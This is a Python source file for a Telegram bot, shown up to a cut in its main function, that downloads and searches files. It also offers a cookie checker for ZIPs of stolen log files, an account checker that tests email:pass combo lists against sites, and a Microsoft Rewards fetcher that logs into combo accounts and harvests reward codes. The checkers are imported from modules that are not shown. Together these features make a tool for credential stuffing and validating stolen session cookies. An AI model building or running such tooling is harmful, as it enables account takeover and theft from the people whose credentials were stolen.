import os, re, time, asyncio, tempfile, zipfile, shutil
import telegram.error
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from config import BOT_TOKEN, AUTO_DELETE_DELAY
from utils import *
from utils import _match_line          # <-- FIX: explicitly import the underscore function
from checkers.cookie import COOKIE_CHECKERS
from checkers.account import ACCOUNT_CHECKERS
from checkers.microsoft_rewards import check_batch

# ---------- Session store ----------
sessions = {}

# ---------- Auto delete ----------
async def start_auto_delete(chat_id, context, delay=AUTO_DELETE_DELAY):
    session = sessions.get(chat_id)
    if not session:
        return
    if session.get("timer_task"):
        session["timer_task"].cancel()
    async def delete_after():
        await asyncio.sleep(delay)
        session = sessions.get(chat_id)
        if session and session["files"]:
            for f in session["files"]:
                try:
                    os.remove(f["path"])
                except OSError:
                    pass
            sessions[chat_id] = {"files": [], "state": "waiting_urls", "progress_msg_id": None, "timer_task": None,
                                "batch_items": [], "regex_mode": False, "search_history": []}
            try:
                await context.bot.send_message(chat_id, "⏰ Auto-deleted files after 1 hour.\nSend /start to begin again.")
            except:
                pass
    session["timer_task"] = asyncio.create_task(delete_after())

# ---------- Summary builder ----------
def build_summary(downloaded_files, overall_start):
    total_size = sum(f["size"] for f in downloaded_files)
    total_time = time.time() - overall_start
    avg_speed = total_size / total_time if total_time > 0 else 0
    summary = "✅ **Download Complete!**\n\n"
    summary += "╔══════════════════════════════╗\n║     👑 PREMIUM STATS        ║\n╚══════════════════════════════╝\n\n"
    for f in downloaded_files:
        speed = f["size"] / f["duration"] if f["duration"] > 0 else 0
        summary += f"📄 `{f['name']}`\n   ├ Size: {format_size(f['size'])}\n"
        if f['duration'] > 0:
            summary += f"   ├ Time: {f['duration']:.1f}s\n   ├ Speed: {format_speed(speed)}\n   └ Server: {f['server_response']*1000:.0f}ms\n"
        if f.get("resumed"):
            summary += "   └ 🔄 Resumed download\n"
        summary += "\n"
    summary += f"╔══════════════════════════════╗\n║ 📦 Total: {format_size(total_size)}\n║ ⏱️ Time: {total_time:.1f}s\n║ 🚀 Avg: {format_speed(avg_speed)}\n╚══════════════════════════════╝\n\n✍️ Send search text, /merge, or forward more files."
    return summary

# ---------- URL parser ----------
def extract_urls_with_passwords(text: str):
    lines = text.splitlines()
    results = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if '|' in line:
            url_match = re.search(r'https?://\S+', line)
            if url_match:
                url = url_match.group(0)
                rest = line[url_match.end():].strip()
                password = rest[1:].strip() if rest.startswith('|') else None
                results.append({"url": url, "password": password})
        else:
            for u in extract_urls(line):
                results.append({"url": u, "password": None})
    return results

# ---------- Search helper ----------
async def do_search(update: Update, context, search_text, use_regex, files):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id, {})
    search_msg = await update.message.reply_text(f"🔍 Searching for \"{search_text}\" in {len(files)} file(s)...")
    results = []
    total_lines_scanned = 0
    for file_info in files:
        fname = file_info["name"]
        try:
            # Try multiple encodings
            content = None
            for enc in ['utf-8', 'latin-1', 'utf-16', 'cp1252']:
                try:
                    with open(file_info["path"], 'r', encoding=enc) as f:
                        content = f.read()
                    break
                except:
                    continue
            if content is None:
                results.append(f"{fname}: [unreadable encoding]")
                continue
            lines = content.split('\n')
            for line in lines:
                total_lines_scanned += 1
                if _match_line(line, search_text, use_regex):
                    results.append(line.rstrip())
        except Exception as e:
            results.append(f"{fname}: [Error: {e}]")

    if not results:
        await search_msg.edit_text(
            f"🔍 No matches for \"{search_text}\".\n📋 Lines scanned: {total_lines_scanned}\n\nTry another search or /merge."
        )
        return
    seen = set()
    unique_results = [r for r in results if not (r in seen or seen.add(r))]
    result_path = os.path.join(tempfile.mkdtemp(), "search_results.txt")
    with open(result_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(unique_results))
    mode_str = "regex" if use_regex else "text"
    with open(result_path, 'rb') as doc:
        await update.message.reply_document(document=doc, filename="search_results.txt",
            caption=f"📄 {len(unique_results)} unique matches (from {len(results)} total) in {total_lines_scanned} lines. Mode: {mode_str}")
    os.remove(result_path)
    await search_msg.delete()
    if "search_history" not in session:
        session["search_history"] = []
    session["search_history"].append({"text": search_text, "matches": len(unique_results), "mode": mode_str})
    if len(session["search_history"]) > 50:
        session["search_history"] = session["search_history"][-50:]
    await update.message.reply_text(f"✅ Search complete. /history to see past searches.")

# ---------- URL download processor ----------
async def _process_urls(chat_id, urls_with_passwords, update, context):
    session = sessions.get(chat_id)
    progress_msg = await context.bot.send_message(chat_id, "⏳ Downloading...")
    session["progress_msg_id"] = progress_msg.message_id
    temp_dir = tempfile.mkdtemp()
    downloaded_files = []
    total = len(urls_with_passwords)
    overall_start = time.time()

    async def update_progress(file_idx, file_name, downloaded, total_size, file_start_time):
        elapsed = time.time() - file_start_time
        speed = downloaded / elapsed if elapsed > 0 else 0
        pct = int(downloaded / total_size * 100) if total_size else 0
        bar_len = 10
        filled = int(pct / 100 * bar_len)
        await context.bot.edit_message_text(chat_id=chat_id, message_id=session["progress_msg_id"],
            text=f"📥 {file_idx}/{total}: {file_name}\n▕{'█' * filled}{'░' * (bar_len - filled)}▏ {pct}%\n⚡ {format_speed(speed)}  |  {format_size(downloaded)} / {format_size(total_size)}")

    for i, entry in enumerate(urls_with_passwords, 1):
        url = entry["url"]
        password = entry.get("password")
        fname = filename_from_url(url)
        dest = os.path.join(temp_dir, fname)
        file_start = time.time()

        async def cb(downloaded, total_size, i=i, fname=fname, start=file_start):
            await update_progress(i, fname, downloaded, total_size, start)

        throttled = ThrottledProgress(cb)
        success, size, duration, server_response, resumed = await download_file(url, dest, progress_callback=throttled, resume=True)
        await throttled.flush()

        if success:
            if is_archive(fname):
                try:
                    extracted = extract_archive(dest, password)
                except PasswordRequired:
                    session["password_archive_path"] = dest
                    session["state"] = "waiting_password"
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=session["progress_msg_id"],
                        text=f"🔐 Archive `{fname}` is password protected.\nPlease send the password.")
                    return
                if extracted:
                    os.remove(dest)
                    for path in extracted:
                        downloaded_files.append({"path": path, "name": f"📦 {os.path.basename(path)}", "size": os.path.getsize(path), "duration": 0, "server_response": 0, "url": ""})
                else:
                    downloaded_files.append({"path": dest, "name": fname, "size": size, "duration": duration, "server_response": server_response, "url": url, "resumed": resumed})
            else:
                downloaded_files.append({"path": dest, "name": fname, "size": size, "duration": duration, "server_response": server_response, "url": url, "resumed": resumed})
        else:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=session["progress_msg_id"], text=f"⚠️ Failed: {i}/{total} — {fname}")
            await asyncio.sleep(1.5)

    if downloaded_files:
        session["files"] = downloaded_files
        session["state"] = "waiting_search"
        summary = build_summary(downloaded_files, overall_start)
        await context.bot.edit_message_text(chat_id=chat_id, message_id=session["progress_msg_id"], text=summary, parse_mode="Markdown")
        await start_auto_delete(chat_id, context)
    else:
        session["state"] = "waiting_urls"
        await context.bot.edit_message_text(chat_id=chat_id, message_id=session["progress_msg_id"], text="❌ No files downloaded.")

# ===================================================================
# COMMAND HANDLERS
# ===================================================================

async def start(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if session and session.get("timer_task"):
        session["timer_task"].cancel()
    sessions[chat_id] = {"files": [], "state": "waiting_urls", "progress_msg_id": None, "timer_task": None,
                        "batch_items": [], "regex_mode": False, "search_history": []}
    await update.message.reply_text(
        "👑 **Premium Universal Bot**\n\n"
        "📎 **Download:** Forward files or send URLs\n"
        "📦 Archives auto-extracted (ZIP, tar.gz)\n"
        "🔐 Password ZIPs: `url|password` or I'll ask\n"
        "📊 Auto-resume interrupted downloads\n\n"
        "🔍 **Search:** Send text after download\n"
        "🔵 /regex — toggle regex search\n"
        "🌐 /stream url text — search without download\n\n"
        "🍪 **Cookie Checker:** /cookie site\n"
        "🔐 **Account Checker:** /account site\n"
        "🎮 **Rewards Fetcher:** /rewards\n\n"
        "📋 /history — search history\n"
        "🔀 /merge — combine & deduplicate\n"
        "🗂 /batch — queue multiple downloads\n"
        "⏳ Auto-delete after 1h — /cancel\n\n"
        "Type / for all commands.",
        parse_mode="Markdown")

async def help_cmd(update: Update, context):
    session = sessions.get(update.effective_chat.id, {})
    regex_status = "🔵 ON" if session.get("regex_mode") else "⚪ OFF"
    cookie_sites = list(COOKIE_CHECKERS.keys())
    account_sites = list(ACCOUNT_CHECKERS.keys())
    await update.message.reply_text(
        f"👑 **Commands**\n\n"
        f"**Download:** /start /batch /done /cancel /delete /stats\n"
        f"**Search:** /regex {regex_status} /stream /history /search /clearhistory\n"
        f"**Files:** /merge /cancel\n"
        f"**Cookie Checker:** /cookie [{', '.join(cookie_sites)}]\n"
        f"**Account Checker:** /account [{', '.join(account_sites)}]\n"
        f"**Rewards:** /rewards\n"
        f"Send / for quick help.",
        parse_mode="Markdown")

async def delete_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session or not session.get("files"):
        await update.message.reply_text("No files to delete.")
        return
    if session.get("timer_task"):
        session["timer_task"].cancel()
    for f in session["files"]:
        try:
            os.remove(f["path"])
        except OSError:
            pass
    sessions[chat_id] = {"files": [], "state": "waiting_urls", "progress_msg_id": None, "timer_task": None,
                        "batch_items": [], "regex_mode": session.get("regex_mode", False),
                        "search_history": session.get("search_history", [])}
    await update.message.reply_text("🗑 All files deleted.")

async def stats_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session or not session.get("files"):
        await update.message.reply_text("No files downloaded.")
        return
    files = session["files"]
    total_size = sum(f["size"] for f in files)
    total_time = sum(f["duration"] for f in files)
    avg_speed = total_size / total_time if total_time > 0 else 0
    await update.message.reply_text(
        f"📊 **Stats**\nFiles: {len(files)}\nSize: {format_size(total_size)}\n"
        f"Time: {total_time:.1f}s\nAvg: {format_speed(avg_speed)}",
        parse_mode="Markdown")

async def merge_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session or not session.get("files"):
        await update.message.reply_text("No files to merge.")
        return
    seen = set()
    merged_lines = []
    for file_info in session["files"]:
        try:
            with open(file_info["path"], 'r', encoding='utf-8') as f:
                for line in f:
                    if line not in seen:
                        seen.add(line)
                        merged_lines.append(line)
        except:
            continue
    if not merged_lines:
        await update.message.reply_text("No readable text.")
        return
    merged_path = os.path.join(tempfile.mkdtemp(), "merged_deduped.txt")
    with open(merged_path, 'w', encoding='utf-8') as out:
        out.writelines(merged_lines)
    for f in session["files"]:
        try:
            os.remove(f["path"])
        except OSError:
            pass
    merged_size = os.path.getsize(merged_path)
    session["files"] = [{"path": merged_path, "name": "📑 merged_deduped.txt", "size": merged_size, "duration": 0, "server_response": 0, "url": ""}]
    session["state"] = "waiting_search"
    await update.message.reply_text(f"🔀 Merged & deduplicated.\n{len(merged_lines)} unique lines.\n{format_size(merged_size)}\nSend search text.")

async def cancel_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session:
        await update.message.reply_text("Nothing to cancel.")
        return
    if session.get("state") == "batch_collecting":
        session["state"] = "waiting_urls"
        session["batch_items"] = []
        await update.message.reply_text("❎ Batch cancelled.")
        return
    if session.get("state") in ("waiting_cookie_zip", "waiting_account_file", "waiting_rewards_file", "waiting_password"):
        session["state"] = "waiting_urls"
        session["password_archive_path"] = None
        await update.message.reply_text("❎ Operation cancelled.")
        return
    if session.get("batch_remaining"):
        session["batch_remaining"] = None
        session["state"] = "waiting_urls"
        await update.message.reply_text("❎ Batch cancelled.")
        return
    if session.get("timer_task"):
        session["timer_task"].cancel()
        session["timer_task"] = None
        await update.message.reply_text("⏸ Auto-delete cancelled.")
    else:
        await update.message.reply_text("No active timer.")

async def regex_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session:
        session = {"files": [], "state": "waiting_urls", "regex_mode": False, "search_history": []}
        sessions[chat_id] = session
    session["regex_mode"] = not session.get("regex_mode", False)
    status = "🔵 ON" if session["regex_mode"] else "⚪ OFF"
    await update.message.reply_text(f"🔍 Regex: **{status}**", parse_mode="Markdown")

async def history_cmd(update: Update, context):
    session = sessions.get(update.effective_chat.id, {})
    history = session.get("search_history", [])
    if not history:
        await update.message.reply_text("No search history.")
        return
    lines = ["📋 **Search History**\n"]
    for i, entry in enumerate(history[-10:], 1):
        lines.append(f"{i}. `{entry['text']}` — {entry['matches']} matches [{entry['mode']}]")
    lines.append("\n/search n to re-run. /clearhistory to delete.")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def search_n_cmd(update: Update, context):
    session = sessions.get(update.effective_chat.id, {})
    history = session.get("search_history", [])
    if not history:
        await update.message.reply_text("No history.")
        return
    try:
        n = int(context.args[0]) if context.args else 0
        if n < 1 or n > len(history):
            raise ValueError
    except:
        await update.message.reply_text(f"Usage: /search 1-{len(history)}")
        return
    entry = history[n - 1]
    files = session.get("files", [])
    if not files:
        await update.message.reply_text("No files downloaded.")
        return
    await do_search(update, context, entry['text'], entry['mode'] == 'regex', files)

async def clearhistory_cmd(update: Update, context):
    session = sessions.get(update.effective_chat.id)
    if session:
        session["search_history"] = []
    await update.message.reply_text("🗑 History cleared.")

async def stream_cmd(update: Update, context):
    session = sessions.get(update.effective_chat.id, {})
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /stream url text")
        return
    url = args[0]
    search_text = ' '.join(args[1:])
    use_regex = session.get("regex_mode", False)
    progress_msg = await update.message.reply_text("🌐 Streaming search...")
    results, total_lines, duration = await stream_search(url, search_text, use_regex)
    if not results:
        await progress_msg.edit_text(f"🔍 No matches. {total_lines} lines in {duration:.1f}s")
        return
    seen = set()
    unique_results = [r for r in results if not (r in seen or seen.add(r))]
    result_path = os.path.join(tempfile.mkdtemp(), "stream_results.txt")
    with open(result_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(unique_results))
    with open(result_path, 'rb') as doc:
        await update.message.reply_document(document=doc, filename="stream_results.txt",
            caption=f"🌐 {len(unique_results)} matches in {total_lines} lines. {duration:.1f}s")
    os.remove(result_path)
    await progress_msg.delete()

# ===================================================================
# COOKIE CHECKER
# ===================================================================

async def cookie_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    args = context.args
    available_sites = list(COOKIE_CHECKERS.keys())
    if not args:
        await update.message.reply_text(
            f"🍪 **Cookie Checker**\n\nUsage: `/cookie site`\n\nSites: {', '.join(available_sites)}\n\nExample: `/cookie netflix`\nThen upload a ZIP file with log files.",
            parse_mode="Markdown")
        return
    site = args[0].lower()
    if site not in COOKIE_CHECKERS:
        await update.message.reply_text(f"❌ Unknown site. Available: {', '.join(available_sites)}")
        return
    if chat_id not in sessions:
        sessions[chat_id] = {}
    sessions[chat_id]["cookie_check_site"] = site
    sessions[chat_id]["state"] = "waiting_cookie_zip"
    await update.message.reply_text(f"🍪 **Cookie Checker: {site.upper()}**\n\nUpload a ZIP file with log files.\nSend /cancel to abort.")

# ===================================================================
# ACCOUNT CHECKER
# ===================================================================

async def account_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    args = context.args
    available_sites = list(ACCOUNT_CHECKERS.keys())
    if not args:
        await update.message.reply_text(
            f"🔐 **Account Checker**\n\nUsage: `/account site`\n\nSites: {', '.join(available_sites)}\n\nExample: `/account netflix`\nThen upload a .txt file with `email:pass` combos.",
            parse_mode="Markdown")
        return
    site = args[0].lower()
    if site not in ACCOUNT_CHECKERS:
        await update.message.reply_text(f"❌ Unknown site. Available: {', '.join(available_sites)}")
        return
    if chat_id not in sessions:
        sessions[chat_id] = {}
    sessions[chat_id]["account_check_site"] = site
    sessions[chat_id]["state"] = "waiting_account_file"
    await update.message.reply_text(f"🔐 **Account Checker: {site.upper()}**\n\nUpload a .txt file with `email:pass` combos.\nSend /cancel to abort.")

# ===================================================================
# MICROSOFT REWARDS
# ===================================================================

async def rewards_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    args = context.args
    try:
        threads = int(args[0]) if len(args) > 0 else 10
        timeout = int(args[1]) if len(args) > 1 else 10
    except:
        threads, timeout = 10, 10
    
    if chat_id not in sessions:
        sessions[chat_id] = {}
    sessions[chat_id]["rewards_threads"] = threads
    sessions[chat_id]["rewards_timeout"] = timeout
    sessions[chat_id]["state"] = "waiting_rewards_file"
    
    await update.message.reply_text(
        f"🎮 **Microsoft Rewards Code Fetcher**\n\n"
        f"Threads: {threads} | Timeout: {timeout}s\n\n"
        f"Upload a .txt file with `email:pass` combos.\n"
        f"The bot will check accounts and return any reward codes found.\n\n"
        f"Send /cancel to abort."
    )

# ===================================================================
# BATCH
# ===================================================================

async def batch_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    if chat_id not in sessions:
        sessions[chat_id] = {"files": [], "state": "waiting_urls", "batch_items": [], "regex_mode": False, "search_history": []}
    sessions[chat_id]["state"] = "batch_collecting"
    sessions[chat_id]["batch_items"] = []
    await update.message.reply_text("📑 **Batch Mode** — Send links/files, then /done. /cancel to abort.")

async def done_cmd(update: Update, context):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    if not session or session.get("state") != "batch_collecting":
        await update.message.reply_text("No batch active.")
        return
    items = session.get("batch_items", [])
    if not items:
        await update.message.reply_text("No items queued.")
        session["state"] = "waiting_urls"
        return
    await update.message.reply_text(f"⚙️ Processing {len(items)} items...")
    session["state"] = "waiting_urls"
    session["batch_items"] = []
    urls = [{"url": i["url"], "password": i.get("password")} for i in items if i["type"] == "url"]
    if urls:
        await _process_urls(chat_id, urls, update, context)

# ===================================================================
# DOCUMENT HANDLER
# ===================================================================

async def handle_document(update: Update, context):
    chat_id = update.effective_chat.id
    document = update.message.document
    if not document or not document.file_name:
        return
    if chat_id not in sessions:
        sessions[chat_id] = {"files": [], "state": "waiting_urls", "batch_items": [], "regex_mode": False, "search_history": []}
    session = sessions[chat_id]
    state = session.get("state", "")

    # REWARDS CHECKER
    if state == "waiting_rewards_file":
        msg = await update.message.reply_text("🎮 Checking Microsoft Rewards accounts...")
        file = await context.bot.get_file(document.file_id)
        combo_path = os.path.join(tempfile.mkdtemp(), "combos.txt")
        await file.download_to_drive(combo_path)
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        os.remove(combo_path)
        if not combos:
            await msg.edit_text("❌ No valid combos found.")
            session["state"] = "waiting_urls"
            return
        threads = session.get("rewards_threads", 10)
        timeout = session.get("rewards_timeout", 10)
        await msg.edit_text(f"🎮 Checking {len(combos)} accounts (threads={threads})...")
        
        import concurrent.futures
        loop = asyncio.get_event_loop()
        results = await loop.run_in_executor(None, check_batch, combos, threads, timeout)
        
        summary = f"🎮 **Microsoft Rewards Results**\n\n"
        summary += f"📋 Total: {results['total']}\n"
        summary += f"✅ Valid: {len(results['valid_accounts'])}\n"
        summary += f"❌ Invalid: {len(results['invalid_accounts'])}\n"
        summary += f"🎁 Codes: {len(results['codes'])}\n"
        
        files_sent = []
        
        if results['valid_accounts']:
            valid_path = os.path.join(tempfile.mkdtemp(), "valid_accounts.txt")
            with open(valid_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(results['valid_accounts']))
            with open(valid_path, 'rb') as doc:
                await update.message.reply_document(document=doc, filename="valid_accounts.txt",
                    caption=f"✅ {len(results['valid_accounts'])} valid accounts")
            os.remove(valid_path)
            files_sent.append("valid_accounts.txt")
        
        if results['codes']:
            codes_path = os.path.join(tempfile.mkdtemp(), "rewards_codes.txt")
            with open(codes_path, 'w', encoding='utf-8') as f:
                f.write("=" * 50 + "\nMICROSOFT REWARDS CODES\n" + "=" * 50 + "\n\n")
                for c in results['codes']:
                    f.write(f"Code: {c['code']}\nAccount: {c['email']}\nPass: {c['password']}\nInfo: {c['info']}\nCategory: {c.get('category', 'Unknown')}\n" + "-" * 30 + "\n\n")
            with open(codes_path, 'rb') as doc:
                await update.message.reply_document(document=doc, filename="rewards_codes.txt",
                    caption=f"🎁 {len(results['codes'])} reward codes found!")
            os.remove(codes_path)
            files_sent.append("rewards_codes.txt")
            
            category_codes = {}
            for c in results['codes']:
                cat = c.get('category', 'Unknown')
                if cat not in category_codes:
                    category_codes[cat] = []
                category_codes[cat].append(c)
            for cat, codes in category_codes.items():
                if codes:
                    cat_path = os.path.join(tempfile.mkdtemp(), f"{cat.lower()}_codes.txt")
                    with open(cat_path, 'w', encoding='utf-8') as f:
                        f.write(f"{cat.upper()} CODES\n" + "=" * 50 + "\n\n")
                        for c in codes:
                            f.write(f"Code: {c['code']}\nAccount: {c['email']}:{c['password']}\nInfo: {c['info']}\n" + "-" * 30 + "\n\n")
                    with open(cat_path, 'rb') as doc:
                        await update.message.reply_document(document=doc, filename=f"{cat.lower()}_codes.txt",
                            caption=f"🎁 {len(codes)} {cat} codes")
                    os.remove(cat_path)
                    files_sent.append(f"{cat.lower()}_codes.txt")
        
        if results['invalid_accounts']:
            invalid_path = os.path.join(tempfile.mkdtemp(), "invalid_accounts.txt")
            with open(invalid_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(results['invalid_accounts']))
            with open(invalid_path, 'rb') as doc:
                await update.message.reply_document(document=doc, filename="invalid_accounts.txt",
                    caption=f"❌ {len(results['invalid_accounts'])} invalid accounts")
            os.remove(invalid_path)
            files_sent.append("invalid_accounts.txt")
        
        summary += f"\n📁 Files sent: {', '.join(files_sent) if files_sent else 'None'}"
        await msg.edit_text(summary, parse_mode="Markdown")
        session["state"] = "waiting_urls"
        return

    # COOKIE CHECKER: ZIP upload
    if state == "waiting_cookie_zip":
        if not document.file_name.endswith('.zip'):
            await update.message.reply_text("❌ Please upload a ZIP file. /cancel to abort.")
            return
        site = session.get("cookie_check_site", "")
        checker_cls = COOKIE_CHECKERS.get(site)
        if not checker_cls:
            await update.message.reply_text("❌ Session error. /cookie again.")
            return
        msg = await update.message.reply_text("📦 Downloading ZIP...")
        file = await context.bot.get_file(document.file_id)
        zip_path = os.path.join(tempfile.mkdtemp(), "logs.zip")
        extract_dir = tempfile.mkdtemp()
        await file.download_to_drive(zip_path)
        try:
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(extract_dir)
        except Exception as e:
            await msg.edit_text(f"❌ Invalid ZIP: {e}")
            os.remove(zip_path)
            session["state"] = "waiting_urls"
            return
        await msg.edit_text("🔍 Searching for cookies...")
        checker = checker_cls()
        all_cookies = []
        files_scanned = 0
        for root, dirs, files in os.walk(extract_dir):
            for fname in files:
                if fname.endswith('.txt'):
                    files_scanned += 1
                    filepath = os.path.join(root, fname)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            cookies = checker.extract_cookies_from_text(f.read())
                            all_cookies.extend(cookies)
                    except:
                        pass
        os.remove(zip_path)
        shutil.rmtree(extract_dir, ignore_errors=True)
        if not all_cookies:
            await msg.edit_text(f"🔍 Scanned {files_scanned} files. No {site} cookies found.")
            session["state"] = "waiting_urls"
            return
        all_cookies = list(set(all_cookies))
        await msg.edit_text(f"🔍 Found {len(all_cookies)} cookies. Checking...")
        results = await checker.check_cookies_batch(all_cookies)
        summary = f"🍪 **Cookie Results: {site.upper()}**\n\n📁 Files: {files_scanned}\n🔍 Found: {len(all_cookies)}\n✅ Valid: {results['valid']}\n❌ Invalid: {results['invalid']}\n⚠️ Errors: {results['error']}\n"
        if results.get('valid_cookies'):
            valid_path = os.path.join(tempfile.mkdtemp(), f"valid_{site}_cookies.txt")
            with open(valid_path, 'w') as f:
                f.write('\n'.join(results['valid_cookies']))
            with open(valid_path, 'rb') as doc:
                await update.message.reply_document(document=doc, filename=f"valid_{site}_cookies.txt", caption=f"✅ {results['valid']} valid {site} cookies")
            os.remove(valid_path)
        await msg.edit_text(summary, parse_mode="Markdown")
        session["state"] = "waiting_urls"
        return

    # ACCOUNT CHECKER: txt upload
    if state == "waiting_account_file":
        site = session.get("account_check_site", "")
        checker_cls = ACCOUNT_CHECKERS.get(site)
        if not checker_cls:
            await update.message.reply_text("❌ Session error. /account again.")
            return
        msg = await update.message.reply_text("📥 Downloading file...")
        file = await context.bot.get_file(document.file_id)
        combo_path = os.path.join(tempfile.mkdtemp(), "combos.txt")
        await file.download_to_drive(combo_path)
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        os.remove(combo_path)
        if not combos:
            await msg.edit_text("❌ No valid combos found.")
            session["state"] = "waiting_urls"
            return
        await msg.edit_text(f"🔐 Checking {len(combos)} accounts...")
        checker = checker_cls()
        results = await checker.check_accounts_batch(combos)
        summary = f"🔐 **Account Results: {site.upper()}**\n\n📋 Total: {results['total']}\n✅ Valid: {results['valid']}\n❌ Invalid: {results['invalid']}\n⚠️ Errors: {results['error']}\n"
        if results.get('valid_accounts'):
            valid_path = os.path.join(tempfile.mkdtemp(), f"valid_{site}_accounts.txt")
            with open(valid_path, 'w') as f:
                f.write('\n'.join(results['valid_accounts']))
            with open(valid_path, 'rb') as doc:
                await update.message.reply_document(document=doc, filename=f"valid_{site}_accounts.txt", caption=f"✅ {results['valid']} valid {site} accounts")
            os.remove(valid_path)
        await msg.edit_text(summary, parse_mode="Markdown")
        session["state"] = "waiting_urls"
        return

    # BATCH MODE
    if state == "batch_collecting":
        session["batch_items"].append({"type": "document", "document": document})
        await update.message.reply_text(f"📎 File queued (#{len(session['batch_items'])}). /done when ready.")
        return

    # NORMAL FILE DOWNLOAD
    fname = re.sub(r'[<>:"/\\|?*]', '_', document.file_name or "file")
    progress_msg = await update.message.reply_text(f"📥 Downloading: {fname}...")
    session["progress_msg_id"] = progress_msg.message_id
    temp_dir = tempfile.mkdtemp()
    dest = os.path.join(temp_dir, fname)
    try:
        success, size, duration = await download_forwarded_file(chat_id, document, dest, context, session, fname, progress_msg.message_id)
    except Exception as e:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=f"❌ Failed: {str(e)[:100]}")
        return

    if is_archive(fname):
        try:
            extracted = extract_archive(dest)
        except PasswordRequired:
            session["state"] = "waiting_password"
            session["password_archive_path"] = dest
            await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                text=f"🔐 Archive `{fname}` is password protected.\nPlease send the password.")
            return
        if extracted:
            os.remove(dest)
            for path in extracted:
                session["files"].append({"path": path, "name": f"📦 {os.path.basename(path)}", "size": os.path.getsize(path), "duration": 0, "server_response": 0, "url": ""})
        else:
            session["files"].append({"path": dest, "name": fname, "size": size, "duration": duration, "server_response": 0, "url": ""})
    else:
        session["files"].append({"path": dest, "name": fname, "size": size, "duration": duration, "server_response": 0, "url": ""})

    session["state"] = "waiting_search"
    total = len(session["files"])
    total_size = sum(f["size"] for f in session["files"])
    await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
        text=f"✅ Added: {fname}\nTotal: {total} files ({format_size(total_size)})")
    if not session.get("timer_task"):
        await start_auto_delete(chat_id, context)

# ===================================================================
# TEXT MESSAGE HANDLER
# ===================================================================

async def handle_message(update: Update, context):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    if text == "/":
        await help_cmd(update, context)
        return
    if not text:
        return
    if chat_id not in sessions:
        sessions[chat_id] = {"files": [], "state": "waiting_urls", "batch_items": [], "regex_mode": False, "search_history": []}
    session = sessions[chat_id]
    state = session["state"]

    if state == "batch_collecting":
        urls = extract_urls_with_passwords(text)
        if urls:
            session["batch_items"].extend([{"type": "url", "url": u["url"], "password": u["password"]} for u in urls])
            await update.message.reply_text(f"📎 {len(urls)} link(s) queued. Total: {len(session['batch_items'])}. /done.")
        else:
            await update.message.reply_text("Send URLs or /done.")
        return

    if state == "waiting_password":
        password = text.strip()
        archive_path = session.get("password_archive_path")
        if not archive_path:
            await update.message.reply_text("Session error. /start again.")
            return
        try:
            extracted = extract_archive(archive_path, password)
        except PasswordRequired:
            await update.message.reply_text("❌ Wrong password. Try again or /cancel.")
            return
        os.remove(archive_path)
        for path in extracted:
            session["files"].append({"path": path, "name": f"📦 {os.path.basename(path)}", "size": os.path.getsize(path), "duration": 0, "server_response": 0, "url": ""})
        session["state"] = "waiting_search"
        session["password_archive_path"] = None
        await start_auto_delete(chat_id, context)
        await update.message.reply_text(f"✅ Extracted. {len(session['files'])} files ready. Send search text.")
        return

    if state == "waiting_urls":
        urls = extract_urls_with_passwords(text)
        if not urls:
            await update.message.reply_text("Send URLs, forward a file, or /batch.")
            return
        await _process_urls(chat_id, urls, update, context)
        return

    if state == "waiting_search":
        search_text = text.strip().lower()
        if not search_text:
            await update.message.reply_text("Send search text.")
            return
        files = session.get("files", [])
        if not files:
            await update.message.reply_text("No files to search. Download something first.")
            return
        await do_search(update, context, search_text, session.get("regex_mode", False), files)

# ===================================================================
# MAIN (with conflict retry)
# ===================================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("delete", delete_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("merge", merge_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler("batch", batch_cmd))
    app.add_handler(CommandHandler("done", done_cmd))
    app.add_handler(CommandHandler("regex", regex_cmd))
    app.add_handler(CommandHandler("history", history_cmd))
    app.add_handler(CommandHandler("search", search_n_cmd))
    app.add_handler(CommandHandler("clearhistory", clearhistory_cmd))
    app.add_handler(CommandHandler("stream", stream_cmd))
    app.add_handler(CommandHandler("cookie", cookie_cmd))
    app.add_handler(CommandHandler("account", account_cmd))
    app.add_handler(CommandHandler("rewards", rewards_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
